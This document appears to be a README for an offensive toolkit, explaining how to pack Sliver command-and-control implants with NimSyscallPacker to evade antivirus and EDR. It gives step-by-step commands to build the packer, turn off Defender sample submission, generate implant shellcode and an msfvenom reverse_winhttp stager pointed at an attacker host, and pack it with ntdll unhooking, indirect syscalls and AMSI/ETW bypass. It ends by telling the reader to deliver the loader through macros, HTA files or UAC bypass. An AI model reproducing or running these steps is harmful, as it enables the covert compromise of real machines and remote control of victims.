# NimSyscallPacker Integration

Use [NimSyscallPacker](https://github.com/S3cur3Th1sSh1t/NimSyscallPacker) to pack
your Sliver payload (shellcode, PE, or C# assembly) into a Nim binary that runs
it via **direct/indirect syscalls**, with **ntdll unhooking**, **AMSI/ETW bypass**,
and optional **encryption** — a strong AV/EDR evasion layer on top of the plain
C#/PowerShell/VBA loaders.

---

## 1. Build the packer

### Windows (recommended — this is what the author tests)

1. Install **Git** (required by Nim/Nimble).
2. Download **Nim 2.2.10** (`nim-2.2.10_x64.zip`) and **MinGW-w64 11.1**
   (`mingw64.7z`) from the [Nim download page](https://nim-lang.org/download/).
3. Extract Nim with **7-Zip** (not Explorer's `Expand-Archive` — it drops
   `lib\system.nim`). Nim ships `bin\7zG.exe`; use it to extract MinGW.
4. Add `<nim>\bin` and `<mingw64>\bin` to `%PATH%`, then logoff/logon.
5. Install dependencies and compile:

   ```batch
   nimble install nimcrypto@0.6.0 docopt ptr_math winim https://github.com/S3cur3Th1sSh1t/nim-strenc/
   Set-MpPreference -SubmitSamplesConsent 2
   nim c NimSyscallLoader.nim
   ```

### Linux (best-effort)

```bash
apt-get install nim mingw-w64
nimble install nimcrypto@0.6.0 docopt ptr_math winim https://github.com/S3cur3Th1sSh1t/nim-strenc/
# donut needed for .NET assembly -> shellcode conversion
pip3 install donut-shellcode
nim c -d:noRES NimSyscallLoader.nim
```

> If `--hellsgate` fails to assemble on newer mingw-w64, downgrade to
> `mingw-w64=8.0.0-1`.

---

## 2. Generate the Sliver payload

```bash
# Raw shellcode (full implant as PIC)
sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin

# Or a small msfvenom stager (needs a stage-listener running)
sliver > profiles new --mtls <IP>:<PORT> --format shellcode my-profile
sliver > stage-listener --url http://<IP>:8080 --profile my-profile --prepend-size
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<IP> LPORT=8080 LURI=/hello.woff -f raw -o /tmp/stager.bin
```

You can also pack a standalone `.exe` (`--format exe`) or a .NET assembly.

---

## 3. Pack it

Run the packer and check its exact flags with `--help` (the interface has
evolved across versions), then pack:

```bash
# Linux example (adjust flags to your packer version)
./NimSyscallLoader -f /tmp/sc.bin -o /tmp/loader.exe --unhook --indirect-syscalls

# Windows example
NimSyscallLoader.exe -f C:\tmp\sc.bin -o C:\tmp\loader.exe --unhook --indirect-syscalls
```

Common capabilities (see `--help`): direct/indirect syscalls, `--unhook`
(ntdll unhooking), Hell's Gate / Halo's Gate syscall resolution, AMSI + ETW
patch, sleep/evasion options, and remote-process injection variants.

The output is a standalone EXE (or DLL/CPL) that runs the Sliver payload.

---

## 4. Start the listener & execute

```bash
sliver > mtls --lhost <IP> --lport <PORT>
```

Deliver `loader.exe` via any of the initial-access paths (macro, HTA, UAC
bypass) and execute it.

---

## Helper

`build.sh` automates the Linux setup (Nim + MinGW + deps + compile).
